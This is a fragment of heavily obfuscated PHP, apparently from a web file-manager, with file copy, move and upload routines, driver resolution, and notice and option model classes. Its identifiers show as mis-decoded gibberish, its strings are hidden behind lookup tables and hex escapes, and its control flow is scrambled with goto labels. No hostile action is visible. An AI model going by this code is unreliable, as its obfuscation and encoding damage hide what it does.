Éù¹†ˆ, $C•ª’Š­Šà); if ($C”±ÎÜà) { if ($cÛ÷†µ“èÈ == $eŞŸ®ˆŞ”[487] && trim($cÄª¸ß‹Ä†, $eŞŸ®ˆŞ”[8]) == trim($C•ª’Š­Šà->pathFather($b”Â´¨ğñ), $eŞŸ®ˆŞ”[8])) { return $C•ª’Š­Šà->getPathOuter($b”Â´¨ğñ); } if (method_exists($C•ª’Š­Šà, $cÛ÷†µ“èÈ)) { return $C•ª’Š­Šà->{$cÛ÷†µ“èÈ}($b”Â´¨ğñ, $cÄª¸ß‹Ä†, $eÚ°ç›ÛÙ‹); } } goto eàšååî—®; fÄêÊÔÖ§: if ($D”ñøÖÆÉ) { $BÎµ‡øê¡Ñ = $D”ñøÖÆÉ->getPathOuter($BÎµ‡øê¡Ñ); } return $BÎµ‡øê¡Ñ; goto A˜´ŞœÕĞ“; dîÓØ‘°ë›: $D”ñøÖÆÉ = !1; if ($C•ª’Š­Šà->pathParse[$eŞŸ®ˆŞ”[989]]) { $cÄª¸ß‹Ä† = $C•ª’Š­Šà->pathParse[$eŞŸ®ˆŞ”[989]]; $D”ñøÖÆÉ = $C•ª’Š­Šà; $C•ª’Š­Šà = self::driverMake($cÄª¸ß‹Ä†); } self::check($E Éù¹†ˆ, $b”Â´¨ğñ, $C•ª’Š­Šà, $cÄª¸ß‹Ä†); goto BÓ‹Á÷Š£Ø; BšãéÂ„¢Ë: $E Éù¹†ˆ = self::driverMake($b”Â´¨ğñ); $C•ª’Š­Šà = self::driverMake($cÄª¸ß‹Ä†); $FÌÅŞÁ¼Òù = $cÛ÷†µ“èÈ == $eŞŸ®ˆŞ”[487]; goto dîÓØ‘°ë›; eàšååî—®: $dÖ¤”Š²«µ = $E Éù¹†ˆ->isFile($b”Â´¨ğñ); if (!$dÖ¤”Š²«µ && $C•ª’Š­Šà->getType() == $eŞŸ®ˆŞ”[689] && $E Éù¹†ˆ->getType() == $eŞŸ®ˆŞ”[101]) { $BÎµ‡øê¡Ñ = $C•ª’Š­Šà->copyFolderFromIO($E Éù¹†ˆ, $b”Â´¨ğñ, $cÄª¸ß‹Ä†, $eÚ°ç›ÛÙ‹, $FÌÅŞÁ¼Òù, $d¡İ÷ğÂŸÄ); } else { $BÎµ‡øê¡Ñ = self::copyPath($E Éù¹†ˆ, $b”Â´¨ğñ, $C•ª’Š­Šà, $cÄª¸ß‹Ä†, $eÚ°ç›ÛÙ‹, $FÌÅŞÁ¼Òù, $dÖ¤”Š²«µ, $d¡İ÷ğÂŸÄ); } if ($BÎµ‡øê¡Ñ && $FÌÅŞÁ¼Òù) { $E Éù¹†ˆ->remove($b”Â´¨ğñ); } goto fÄêÊÔÖ§; A˜´ŞœÕĞ“: } private static function check($DÚô§¤»°Û, $Cˆ‡¼ãÀ¤ò, $aÅë¶‚Áœ, &$eƒ—óĞ ‘„) { $F¼¦¶…Ğ¾· =& $_SERVER[õëù©û]; if (self::driverIsSame($DÚô§¤»°Û, $aÅë¶‚Áœ) && $DÚô§¤»°Û->isFolder($Cˆ‡¼ãÀ¤ò) && $DÚô§¤»°Û->isParentOf($Cˆ‡¼ãÀ¤ò, $eƒ—óĞ ‘„)) { show_json(LNG($F¼¦¶…Ğ¾·[990]), !1); } if (!$DÚô§¤»°Û->exist($Cˆ‡¼ãÀ¤ò)) { show_json(LNG($F¼¦¶…Ğ¾·[100]), !1); } } private static function copyPath($B–¬ÔÇ‚Ğ, $bÉ´¤£Ö, $BîÙ¥®‡˜„, $F¸„‡ïßÖ’, $Eœ”Š–»ô‹, $c‡ÒèÍÒ™ù, $Aì”…Å¨‹·, $F™ïà÷«•Ç = false) { goto cÂá©—Šôî; CÃï¢©¦: $FòšùÍ¬‰­ = $BîÙ¥®‡˜„->mkdir($BîÙ¥®‡˜„->getPath($f›Òì©¯ì·)); $F¸„‡ïßÖ’ = $BîÙ¥®‡˜„->getPathInner($FòšùÍ¬‰­); $fõ¹Â±Ïœç = $B–¬ÔÇ‚Ğ->listPath($bÉ´¤£Ö, !0); goto B²Ù»ƒ›Óæ; Fˆî°™ì: if ($Aì”…Å¨‹·) { return self::copyFile($B–¬ÔÇ‚Ğ, $bÉ´¤£Ö, $BîÙ¥®‡˜„, $F¸„‡ïßÖ’, $f»È×Óë, $c‡ÒèÍÒ™ù); } if ($Eœ”Š–»ô‹ == REPEAT_RENAME_FOLDER) { $Eœ”Š–»ô‹ = !1; } $f›Òì©¯ì· = rtrim($F¸„‡ïßÖ’, $Cï‚äÍ¬ƒˆ[8]) . $Cï‚äÍ¬ƒˆ[8] . $f»È×Óë; goto CÃï¢©¦; B²Ù»ƒ›Óæ: $Bå¿–‚ Š = array_merge($fõ¹Â±Ïœç[$Cï‚äÍ¬ƒˆ[73]], $fõ¹Â±Ïœç[$Cï‚äÍ¬ƒˆ[74]]); foreach ($Bå¿–‚ Š as $AËàË‡Œ¬…) { $dˆô‚Ø¨  = $AËàË‡Œ¬…[$Cï‚äÍ¬ƒˆ[29]] == $Cï‚äÍ¬ƒˆ[163]; $bÉ´¤£Ö = $B–¬ÔÇ‚Ğ->getPathInner($AËàË‡Œ¬…[$Cï‚äÍ¬ƒˆ[75]]); $E‘±‹Ä‚à = self::copyPath($B–¬ÔÇ‚Ğ, $bÉ´¤£Ö, $BîÙ¥®‡˜„, $F¸„‡ïßÖ’, $Eœ”Š–»ô‹, $c‡ÒèÍÒ™ù, $dˆô‚Ø¨ ); if (!$E‘±‹Ä‚à) { write_log($Cï‚äÍ¬ƒˆ[991] . $bÉ´¤£Ö . $Cï‚äÍ¬ƒˆ[992] . $F¸„‡ïßÖ’, $Cï‚äÍ¬ƒˆ[993]); } } return $FòšùÍ¬‰­; goto a–óÍó·¯œ; cÂá©—Šôî: $Cï‚äÍ¬ƒˆ =& $_SERVER[õëù©û]; $f»È×Óë = $F™ïà÷«•Ç ? $F™ïà÷«•Ç : $B–¬ÔÇ‚Ğ->getPathName($B–¬ÔÇ‚Ğ->pathThis($bÉ´¤£Ö)); if ($Eœ”Š–»ô‹) { $a§ìŒÓö‰ = $BîÙ¥®‡˜„->fileNameExist($F¸„‡ïßÖ’, $f»È×Óë); $f»È×Óë = $BîÙ¥®‡˜„->fileNameAuto($F¸„‡ïßÖ’, $f»È×Óë, $Eœ”Š–»ô‹, !$Aì”…Å¨‹·); $Eœ”Š–»ô‹ = $a§ìŒÓö‰ ? $Eœ”Š–»ô‹ : !1; } goto Fˆî°™ì; a–óÍó·¯œ: } private static function copyFile($C•Ôö‚Œ¡’, $EÆ¡Õ®óçø, $CÌ°£ÑŠÊ, $b†¿¨³ª, $C‰ÂÄ¨¦ÆÚ, $EÏ˜®¦’ïê) { goto CĞ˜”ÅîÓÎ; d˜çôµÔŠì: $e¨•ç–ÅÎ = $C•Ôö‚Œ¡’->iconvApp($e¨•ç–ÅÎ); $f¾á›ğö¢Á = $CÌ°£ÑŠÊ->upload($b†¿¨³ª, $e¨•ç–ÅÎ, $EÏ˜®¦’ïê); self::remove($eõßœŒ‹ÍÔ . $eò­­ù†¢); goto a‚²˜“¯£à; a‚²˜“¯£à: Hook::trigger($cÓ»‚Ú¿‰[996], $C•Ôö‚Œ¡’, $EÆ¡Õ®óçø, $CÌ°£ÑŠÊ, $b†¿¨³ª, $C‰ÂÄ¨¦ÆÚ, $f¾á›ğö¢Á); return $f¾á›ğö¢Á; goto FÇÒ«×Ôš„; Dé…©Ó©º: mk_dir($eõßœŒ‹ÍÔ); $e¨•ç–ÅÎ = $eõßœŒ‹ÍÔ . $eò­­ù†¢; $e¨•ç–ÅÎ = $C•Ôö‚Œ¡’->download($EÆ¡Õ®óçø, $e¨•ç–ÅÎ); goto d˜çôµÔŠì; CĞ˜”ÅîÓÎ: $cÓ»‚Ú¿‰ =& $_SERVER[õëù©û]; $b†¿¨³ª = $CÌ°£ÑŠÊ->getPath(rtrim($b†¿¨³ª, $cÓ»‚Ú¿‰[8]) . $cÓ»‚Ú¿‰[8] . $C‰ÂÄ¨¦ÆÚ); $eò­­ù†¢ = $cÓ»‚Ú¿‰[994] . time() . rand_string(5); goto F¥ËÊ‚ãÃÄ; F¥ËÊ‚ãÃÄ: Hook::trigger($cÓ»‚Ú¿‰[995], $C•Ôö‚Œ¡’, $EÆ¡Õ®óçø, $CÌ°£ÑŠÊ, $b†¿¨³ª, $C‰ÂÄ¨¦ÆÚ, $eò­­ù†¢); if (self::driverIsSame($C•Ôö‚Œ¡’, $CÌ°£ÑŠÊ)) { if ($EÏ˜®¦’ïê) { $f¾á›ğö¢Á = $CÌ°£ÑŠÊ->moveFile($EÆ¡Õ®óçø, $b†¿¨³ª); } else { $f¾á›ğö¢Á = $CÌ°£ÑŠÊ->copyFile($EÆ¡Õ®óçø, $b†¿¨³ª); } Hook::trigger($cÓ»‚Ú¿‰[996], $C•Ôö‚Œ¡’, $EÆ¡Õ®óçø, $CÌ°£ÑŠÊ, $b†¿¨³ª, $C‰ÂÄ¨¦ÆÚ, $f¾á›ğö¢Á); return $f¾á›ğö¢Á; } $eõßœŒ‹ÍÔ = TEMP_FILES; goto Dé…©Ó©º; FÇÒ«×Ôš„: } public static function pathFather($F‡Ş‘ØêØ) { $eîò¢ñœ´ä = IO::init($F‡Ş‘ØêØ); $D°¡Ùø– = $eîò¢ñœ´ä->pathFather($eîò¢ñœ´ä->path); return $eîò¢ñœ´ä->getPathOuter($D°¡Ùø–); } public static function fileOut($Dé ùï™ƒÛ, $B×Õ’ÓÎä® = false, $f†Ç–Šƒ™ğ = false, $EÜ§š÷à±ˆ = '') { $cÏÃè¥šÄß = self::driverMake($Dé ùï™ƒÛ); if ($cÏÃè¥šÄß->isFileOutServer()) { return $cÏÃè¥šÄß->fileOutServer($Dé ùï™ƒÛ, $B×Õ’ÓÎä®, $f†Ç–Šƒ™ğ, $EÜ§š÷à±ˆ); } return $cÏÃè¥šÄß->fileOut($Dé ùï™ƒÛ, $B×Õ’ÓÎä®, $f†Ç–Šƒ™ğ, $EÜ§š÷à±ˆ); } public static function fileOutImage($dëº ¾ÜÆê, $BÎ‚·§•çì = 250) { $A™Èª¢ŞïÃ = array(250, 600, 1200, 3000); for ($Fºë›âµÇ = 0; $Fºë›âµÇ < count($A™Èª¢ŞïÃ); $Fºë›âµÇ++) { if ($Fºë›âµÇ == 0 && $BÎ‚·§•çì <= $A™Èª¢ŞïÃ[$Fºë›âµÇ]) { $BÎ‚·§•çì = $A™Èª¢ŞïÃ[$Fºë›âµÇ]; break; } else { if ($BÎ‚·§•çì > $A™Èª¢ŞïÃ[$Fºë›âµÇ - 1] && $BÎ‚·§•çì <= $A™Èª¢ŞïÃ[$Fºë›âµÇ]) { $BÎ‚·§•çì = $A™Èª¢ŞïÃ[$Fºë›âµÇ]; break; } else { if ($Fºë›âµÇ == count($A™Èª¢ŞïÃ) - 1 && $BÎ‚·§•çì > $A™Èª¢ŞïÃ[$Fºë›âµÇ]) { $BÎ‚·§•çì = $A™Èª¢ŞïÃ[$Fºë›âµÇ]; break; } } } } $D±ÈÁÖ‘İ¶ = self::driverMake($dëº ¾ÜÆê); if ($D±ÈÁÖ‘İ¶->isFileOutServer()) { return $D±ÈÁÖ‘İ¶->fileOutImageServer($dëº ¾ÜÆê, $BÎ‚·§•çì); } return $D±ÈÁÖ‘İ¶->fileOutImage($dëº ¾ÜÆê, $BÎ‚·§•çì); } private static function driverIsSame($A—ÏÚâÜ, $cç¾Ø—Û½) { goto BÈßˆéÏÔá; BÈßˆéÏÔá: $D¦¨ÆÛº å =& $_SERVER[õëù©û]; $FÍšñŠ‹ = $A—ÏÚâÜ->getType(); $d®åÓÌ´Õê = $cç¾Ø—Û½->getType(); goto Bå¦œ›¢©Ä; Bå¦œ›¢©Ä: if ($FÍšñŠ‹ != $d®åÓÌ´Õê) { return !1; } if ($FÍšñŠ‹ == $D¦¨ÆÛº å[689]) { return !0; } if ($FÍšñŠ‹ == $D¦¨ÆÛº å[101]) { return !0; } goto eË‡ñŸÀš; eË‡ñŸÀš: if ($A—ÏÚâÜ->pathDriver == $cç¾Ø—Û½->pathDriver) { return !0; } return !1; goto FÅ¢ÂÈ¹„; FÅ¢ÂÈ¹„: } public static function copyUpdate($Cë³õë„ÅÍ, $Fè¥¾ÅÔ‰ô) { goto DÅ‹ôŞ’„†; eä’»¯îä¶: $FŒ·•Íàˆ» = array(); foreach ($cÑ¸…å›é° as $B…Í¿—˜°Ë => $dË–İ»“Èİ) { if (isset($eÃ‚Æ±–ğà[$B…Í¿—˜°Ë])) { if ($dË–İ»“Èİ[$CêÖöÖÂÄ[76]] == 1) { continue; } if ($eÃ‚Æ±–ğà[$B…Í¿—˜°Ë][$CêÖöÖÂÄ[77]] == $dË–İ»“Èİ[$CêÖöÖÂÄ[77]]) { continue; } } if ($dË–İ»“Èİ[$CêÖöÖÂÄ[76]] == 1) { $FŒ·•Íàˆ»[] = $Fè¥¾ÅÔ‰ô . $CêÖöÖÂÄ[8] . $B…Í¿—˜°Ë; continue; } $eÄŒŒ›¹ = strstr(trim($B…Í¿—˜°Ë, $CêÖöÖÂÄ[8]), $CêÖöÖÂÄ[8]) ? get_path_father($B…Í¿—˜°Ë) : $CêÖöÖÂÄ[33]; $ašÄ¢åñøó[] = array($CêÖöÖÂÄ[997] => $dË–İ»“Èİ[$CêÖöÖÂÄ[75]], $CêÖöÖÂÄ[998] => rtrim($Fè¥¾ÅÔ‰ô, $CêÖöÖÂÄ[8]) . $CêÖöÖÂÄ[8] . $eÄŒŒ›¹, $CêÖöÖÂÄ[999] => $dË–İ»“Èİ); } $dã«Í“ÙÜÉ = array($CêÖöÖÂÄ[163] => $ašÄ¢åñøó, $CêÖöÖÂÄ[76] => $FŒ·•Íàˆ»); goto Bñ»˜Š¹¡; DÅ‹ôŞ’„†: $CêÖöÖÂÄ =& $_SERVER[õëù©û]; if (!IO::exist($Cë³õë„ÅÍ)) { return !1; } if (!IO::exist($Fè¥¾ÅÔ‰ô)) { IO::mkdir($Fè¥¾ÅÔ‰ô); } goto FÃˆ÷¡£ÕÛ; Bñ»˜Š¹¡: Hook::trigger($CêÖöÖÂÄ[1000], $Cë³õë„ÅÍ, $Fè¥¾ÅÔ‰ô, $dã«Í“ÙÜÉ); foreach ($FŒ·•Íàˆ» as $dË–İ»“Èİ) { IO::mkdir($dË–İ»“Èİ); } foreach ($ašÄ¢åñøó as $dË–İ»“Èİ) { IO::copy($dË–İ»“Èİ[$CêÖöÖÂÄ[997]], $dË–İ»“Èİ[$CêÖöÖÂÄ[998]], REPEAT_REPLACE); } goto aÃ«ä‰ïÁ«; FÃˆ÷¡£ÕÛ: $cÑ¸…å›é° = self::_listAll($Cë³õë„ÅÍ); $eÃ‚Æ±–ğà = self::_listAll($Fè¥¾ÅÔ‰ô); $ašÄ¢åñøó = array(); goto eä’»¯îä¶; aÃ«ä‰ïÁ«: } private static function _listAll($B×¸È¥È‰Ê) { $DñÕ»•¥Í =& $_SERVER[õëù©û]; $B×¸È¥È‰Ê = KodIO::clear($B×¸È¥È‰Ê); $FïëŠĞ´ºÒ = IO::listAll($B×¸È¥È‰Ê); foreach ($FïëŠĞ´ºÒ as &$bÑÜç¦½è‰) { $FÉÁœé„  = substr($bÑÜç¦½è‰[$DñÕ»•¥Í[75]], strlen($B×¸È¥È‰Ê)); $bÑÜç¦½è‰[$DñÕ»•¥Í[1001]] = trim($FÉÁœé„ , $DñÕ»•¥Í[8]); } return array_to_keyvalue($FïëŠĞ´ºÒ, $DñÕ»•¥Í[1001]); } public static function fileSubstr($D•‰ŒÖ†‹ , $FÈŒÅÁæ„, $bÏá¶… ‘â = false) { goto Eää¶¼‰Óµ; F¹È‡é¾µ: if ($FÈŒÅÁæ„ + $bÏá¶… ‘â > $eóÕóß·‹Õ) { $bÏá¶… ‘â = $eóÕóß·‹Õ - $FÈŒÅÁæ„; } if ($bÏá¶… ‘â <= 0) { return $_SERVER[õëù©û][33]; } if ($FÈŒÅÁæ„ < 0 || $FÈŒÅÁæ„ >= $eóÕóß·‹Õ || $bÏá¶… ‘â > 1024 * 1024 * 5) { throw new Exception("\x66\151\x6c\x65\122\145\141\144\x20\145\162\x72\x6f\162\41\40\x73\x74\141\x72\x74\75{$FÈŒÅÁæ„}\x3b\x6c\145\x6e\147\x74\x68\x3d{$bÏá¶… ‘â}\x3b\40\x73\151\172\145\75{$eóÕóß·‹Õ}\x3b"); } goto d±³Â¸¹•£; BöÍÙé¿’Ê: $AÚÛŸ°ÂÙŒ = $bÏá¶… ‘â; if ($FÈŒÅÁæ„ < 0) { $FÈŒÅÁæ„ = $eóÕóß·‹Õ + $FÈŒÅÁæ„; } if ($bÏá¶… ‘â === !1) { $bÏá¶… ‘â = $eóÕóß·‹Õ - $FÈŒÅÁæ„; } goto F¹È‡é¾µ; d±³Â¸¹•£: return $Dª¦Î¯î¹->fileSubstr($D•‰ŒÖ†‹ , $FÈŒÅÁæ„, $bÏá¶… ‘â); goto F‰ôëŒíÀæ; Eää¶¼‰Óµ: $Dª¦Î¯î¹ = self::driverMake($D•‰ŒÖ†‹ ); $eóÕóß·‹Õ = $Dª¦Î¯î¹->size($D•‰ŒÖ†‹ ); $f–İï´èºŒ = $FÈŒÅÁæ„; goto BöÍÙé¿’Ê; F‰ôëŒíÀæ: } private static function driverMake(&$cø•Ÿ«Ô«¦) { goto e—ï•††ØÛ; AÎ¼‡´Ì: if ($cƒ¹·˜ô[$eâÊñõñ§¤[29]] == KodIO::KOD_IO && !self::$driverListSystem[$cƒ¹·˜ô[$eâÊñõñ§¤[363]]]) { return !1; } $cø•Ÿ«Ô«¦ = $cƒ¹·˜ô[$eâÊñõñ§¤[1002]]; $bÛ¶òÕå“ = self::driverGet($cƒ¹·˜ô, $cø•Ÿ«Ô«¦); goto fà™¿®¹´; e—ï•††ØÛ: $eâÊñõñ§¤ =& $_SERVER[õëù©û]; $cƒ¹·˜ô = KodIO::parse($cø•Ÿ«Ô«¦); if (!self::$driverListSystem) { $E±µ²¬„Ğ = Model($eâÊñõñ§¤[699])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($E±µ²¬„Ğ, $eâÊñõñ§¤[363]); } goto AÎ¼‡´Ì; fà™¿®¹´: return $bÛ¶òÕå“; goto BÏ¾Íò…õ¾; BÏ¾Íò…õ¾: } private static function driverGet($DÑàå„½í, &$F·óéôÖ‚‹) { goto AÆè„õã‹í; aÔ´çÒŸ: switch ($DÑàå„½í[$F÷íÓÙÉÙ[29]]) { case KodIO::KOD_IO: $FÂ« ¼³„ê = self::$driverListSystem[$aÜí»Í¦‚Ô]; break; case KodIO::KOD_SOURCE: $F·óéôÖ‚‹ = $aÜí»Í¦‚Ô . $F·óéôÖ‚‹; $FÂ« ¼³„ê = array($F÷íÓÙÉÙ[1004] => $F÷íÓÙÉÙ[1005], $F÷íÓÙÉÙ[6] => $DÑàå„½í); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $C”¨Øé÷õó = $GLOBALS[$F÷íÓÙÉÙ[1006]]; self::$driverListUser = array_to_keyvalue($C”¨Øé÷õó, $F÷íÓÙÉÙ[363]); } $FÂ« ¼³„ê = self::$driverListUser[$aÜí»Í¦‚Ô]; break; case KodIO::KOD_SHARE_LINK: $FÂ« ¼³„ê = array($F÷íÓÙÉÙ[1004] => $F÷íÓÙÉÙ[1007], $F÷íÓÙÉÙ[6] => $DÑàå„½í); $CˆÆé„šŸÇ = Action($F÷íÓÙÉÙ[1008])->sharePathInfo($DÑàå„½í[$F÷íÓÙÉÙ[75]]); $F·óéôÖ‚‹ = $CˆÆé„šŸÇ[$F÷íÓÙÉÙ[365]]; if (!$CˆÆé„šŸÇ[$F÷íÓÙÉÙ[365]]) { $e–š©Å§ÄÚ = Model($F÷íÓÙÉÙ[531])->getInfo($CˆÆé„šŸÇ[$F÷íÓÙÉÙ[436]]); $F·óéôÖ‚‹ = KodIO::clear($e–š©Å§ÄÚ[$F÷íÓÙÉÙ[1009]] . $DÑàå„½í[$F÷íÓÙÉÙ[1002]]); $DÑàå„½í[$F÷íÓÙÉÙ[434]] = $e–š©Å§ÄÚ; $DÑàå„½í[$F÷íÓÙÉÙ[989]] = $F·óéôÖ‚‹; $FÂ« ¼³„ê = array($F÷íÓÙÉÙ[1004] => $F÷íÓÙÉÙ[1010], $F÷íÓÙÉÙ[6] => $DÑàå„½í); } break; case KodIO::KOD_SHARE_ITEM: $FÂ« ¼³„ê = array($F÷íÓÙÉÙ[1004] => $F÷íÓÙÉÙ[1011], $F÷íÓÙÉÙ[6] => $DÑàå„½í); $e–š©Å§ÄÚ = Model($F÷íÓÙÉÙ[531])->getInfo($DÑàå„½í[$F÷íÓÙÉÙ[363]]); if ($e–š©Å§ÄÚ[$F÷íÓÙÉÙ[365]] == $F÷íÓÙÉÙ[463]) { $F·óéôÖ‚‹ = KodIO::clear($e–š©Å§ÄÚ[$F÷íÓÙÉÙ[1009]] . $DÑàå„½í[$F÷íÓÙÉÙ[1002]]); $DÑàå„½í[$F÷íÓÙÉÙ[434]] = $e–š©Å§ÄÚ; $DÑàå„½í[$F÷íÓÙÉÙ[989]] = $F·óéôÖ‚‹; $FÂ« ¼³„ê = array($F÷íÓÙÉÙ[1004] => $F÷íÓÙÉÙ[1012], $F÷íÓÙÉÙ[6] => $DÑàå„½í); } break; default: $F·óéôÖ‚‹ = $DÑàå„½í[$F÷íÓÙÉÙ[75]]; $FÂ« ¼³„ê = array($F÷íÓÙÉÙ[1004] => $F÷íÓÙÉÙ[1013]); break; } $Cºçİ´Ş›È = $DÑàå„½í[$F÷íÓÙÉÙ[75]]; if (!isset(self::$driverCache[$Cºçİ´Ş›È])) { $cªĞÚ…ä„â = strtolower($FÂ« ¼³„ê[$F÷íÓÙÉÙ[90]]); $CÊÌÀ­ôòá = $GLOBALS[$F÷íÓÙÉÙ[6]][$F÷íÓÙÉÙ[84]][$F÷íÓÙÉÙ[1014]]; $e†ğ¬º…Õª = $F÷íÓÙÉÙ[71] . (isset($CÊÌÀ­ôòá[$cªĞÚ…ä„â]) ? $CÊÌÀ­ôòá[$cªĞÚ…ä„â] : ucfirst($cªĞÚ…ä„â)); if (!class_exists($e†ğ¬º…Õª)) { show_json("{$e†ğ¬º…Õª}\40\x6e\157\164\x20\145\x78\151\163\x74\163\x21", !1); } $f£½Á­…¨¶ = isset($FÂ« ¼³„ê[$F÷íÓÙÉÙ[6]]) ? $FÂ« ¼³„ê[$F÷íÓÙÉÙ[6]] : !1; self::$driverCache[$Cºçİ´Ş›È] = new $e†ğ¬º…Õª($f£½Á­…¨¶); } goto A”ä¿’µµ; dÅ•âÖ’õ‰: $d¶‘ëëçÙŞ->path = $F·óéôÖ‚‹; return $d¶‘ëëçÙŞ; goto DŠô—ÇŒ›ô; Fá®íæ¶¬: if (isset($FÂ« ¼³„ê[$F÷íÓÙÉÙ[6]][$F÷íÓÙÉÙ[1015]])) { $d¶‘ëëçÙŞ->pathBase = rtrim($FÂ« ¼³„ê[$F÷íÓÙÉÙ[6]][$F÷íÓÙÉÙ[1015]], $F÷íÓÙÉÙ[8]) . $F÷íÓÙÉÙ[8]; $F·óéôÖ‚‹ = $d¶‘ëëçÙŞ->pathBase . ltrim($F·óéôÖ‚‹, $F÷íÓÙÉÙ[8]); } $F·óéôÖ‚‹ = $d¶‘ëëçÙŞ->getPath($F·óéôÖ‚‹); if (isset($DÑàå„½í[$F÷íÓÙÉÙ[989]])) { $F·óéôÖ‚‹ = $DÑàå„½í[$F÷íÓÙÉÙ[989]]; } goto dÅ•âÖ’õ‰; AÆè„õã‹í: $F÷íÓÙÉÙ =& $_SERVER[õëù©û]; $Fƒ­ß•øÊè = $DÑàå„½í[$F÷íÓÙÉÙ[1003]]; $aÜí»Í¦‚Ô = $DÑàå„½í[$F÷íÓÙÉÙ[363]]; goto aÔ´çÒŸ; A”ä¿’µµ: $d¶‘ëëçÙŞ = self::$driverCache[$Cºçİ´Ş›È]; $d¶‘ëëçÙŞ->pathDriver = $Fƒ­ß•øÊè; $d¶‘ëëçÙŞ->pathBase = $F÷íÓÙÉÙ[33]; goto Fá®íæ¶¬; DŠô—ÇŒ›ô: } } goto E‡™ÚÏƒŸ; Fğ¤Ô¢´Ç×: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\156\x6f\164\x69\143\145\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\x63\157\x6e\x74\x65\156\164", "\141\165\164\x68", "\155\157\x64\145", "\x74\151\x6d\x65", "\164\x79\x70\145", "\154\x65\x76\x65\154", "\x65\x6e\141\142\x6c\x65", "\163\x6f\x72\164"); public function listData($eÆ…¨Œàé = false, $AÊùô¼ä¼í = "\163\x6f\x72\x74", $Câ¡ä„¯ = false) { return parent::listData($eÆ…¨Œàé, $AÊùô¼ä¼í, $Câ¡ä„¯); } public function add($DŒª¢¼™í÷) { goto Dšê±äôŒ; Dšê±äôŒ: $bÈ‰’–­Â” =& $_SERVER[õëù©û]; $aâ“¡ïÜä‚ = $this->findByName($DŒª¢¼™í÷[$bÈ‰’–­Â”[28]]); if ($aâ“¡ïÜä‚) { return !1; } goto bß¼Ç¼­ï¶; EÏ…»õ×Í: return parent::insert($DŒª¢¼™í÷); goto d™ˆÏÔ»Û; bß¼Ç¼­ï¶: $aë«¸ÖÅ§ = time(); if ($DŒª¢¼™í÷[$bÈ‰’–­Â”[12]] == $bÈ‰’–­Â”[2434]) { $aë«¸ÖÅ§ = strtotime($DŒª¢¼™í÷[$bÈ‰’–­Â”[186]]); } $DŒª¢¼™í÷[$bÈ‰’–­Â”[186]] = $aë«¸ÖÅ§; goto EÏ…»õ×Í; d™ˆÏÔ»Û: } public function update($b¨Óù´À»Ş, $f²ùëÛÙÒÀ) { goto D™¯ˆ—è§”; DùÅ±Åí£: $f²ùëÛÙÒÀ[$cùíæÕİß[186]] = $eƒêéñ”ì; return parent::update($b¨Óù´À»Ş, $f²ùëÛÙÒÀ); goto c‚§Æ‹âô©; D™¯ˆ—è§”: $cùíæÕİß =& $_SERVER[õëù©û]; $FŞÄäŠÖ = $this->listData($b¨Óù´À»Ş); $A—ĞÏ‚šˆ“ = $this->findByName($f²ùëÛÙÒÀ[$cùíæÕİß[28]]); goto b®ÍØßßğ; b®ÍØßßğ: if (!$FŞÄäŠÖ || $A—ĞÏ‚šˆ“ && $A—ĞÏ‚šˆ“[$cùíæÕİß[363]] != $FŞÄäŠÖ[$cùíæÕİß[363]]) { return !1; } $eƒêéñ”ì = time(); if ($f²ùëÛÙÒÀ[$cùíæÕİß[12]] == $cùíæÕİß[2434]) { $eƒêéñ”ì = strtotime($f²ùëÛÙÒÀ[$cùíæÕİß[186]]); } goto DùÅ±Åí£; c‚§Æ‹âô©: } public function remove($d‹ô‘Ããˆ°) { $cõ¤¯—ÉÛ¢ = $this->listData($d‹ô‘Ããˆ°); if (!$cõ¤¯—ÉÛ¢ || $cõ¤¯—ÉÛ¢[$_SERVER[õëù©û][1071]]) { return !1; } return parent::remove($d‹ô‘Ããˆ°); } public function sort($fâ‚„Êçù, $C‚‚™Ó²é•) { return parent::update($fâ‚„Êçù, $C‚‚™Ó²é•); } public function enable($c†×²¼±¬, $C‘¦ôæÙ¢³) { return parent::update($c†×²¼±¬, array($_SERVER[õëù©û][2435] => $C‘¦ôæÙ¢³)); } private function initUserOption() { $aŒÎÃ‹‹ =& $_SERVER[õëù©û]; $this->optionType = $aŒÎÃ‹‹[2436]; $this->modelType = $aŒÎÃ‹‹[2437]; $this->field = array($aŒÎÃ‹‹[2438], $aŒÎÃ‹‹[28], $aŒÎÃ‹‹[186], $aŒÎÃ‹‹[29], $aŒÎÃ‹‹[2439], $aŒÎÃ‹‹[684], $aŒÎÃ‹‹[179]); } public function userNoticeGet($D†…ËÍÎÜÚ = false) { $this->initUserOption(); return parent::listData($D†…ËÍÎÜÚ, $_SERVER[õëù©û][363], !0); } public function userNoticeAdd($eÎÏ‰Ó­Æ) { $dÍÛöÜø¹ˆ =& $_SERVER[õëù©û]; $this->initUserOption(); $C®±§ŒÎ­ = $this->findByKey($dÍÛöÜø¹ˆ[2438], $eÎÏ‰Ó­Æ[$dÍÛöÜø¹ˆ[363]]); if ($C®±§ŒÎ­) { return !0; } $EÌæËùœóÑ = array($dÍÛöÜø¹ˆ[2438] => $eÎÏ‰Ó­Æ[$dÍÛöÜø¹ˆ[363]], $dÍÛöÜø¹ˆ[28] => $eÎÏ‰Ó­Æ[$dÍÛöÜø¹ˆ[28]], $dÍÛöÜø¹ˆ[186] => $eÎÏ‰Ó­Æ[$dÍÛöÜø¹ˆ[186]], $dÍÛöÜø¹ˆ[29] => isset($eÎÏ‰Ó­Æ[$dÍÛöÜø¹ˆ[29]]) ? $eÎÏ‰Ó­Æ[$dÍÛöÜø¹ˆ[29]] : 1, $dÍÛöÜø¹ˆ[2439] => isset($eÎÏ‰Ó­Æ[$dÍÛöÜø¹ˆ[2439]]) ? $eÎÏ‰Ó­Æ[$dÍÛöÜø¹ˆ[2439]] : 0, $dÍÛöÜø¹ˆ[684] => 0, $dÍÛöÜø¹ˆ[179] => 0); return parent::insert($EÌæËùœóÑ); } public function userNoticeEdit($d–Œ½À‹¯, $eŞèÊ£Ì) { $this->initUserOption(); return parent::update($d–Œ½À‹¯, $eŞèÊ£Ì); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\x65\155\x5f\157\x70\x74\x69\157\156"; protected $jsonField = array("\x6d\x65\156\x75", "\x72\x6f\x6c\145", "\x72\x6f\154\x65\x47\x72\157\x75\160", "\162\x65\147\151\x73\x74", "\x65\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($e³à‡ÎÙ±) { return 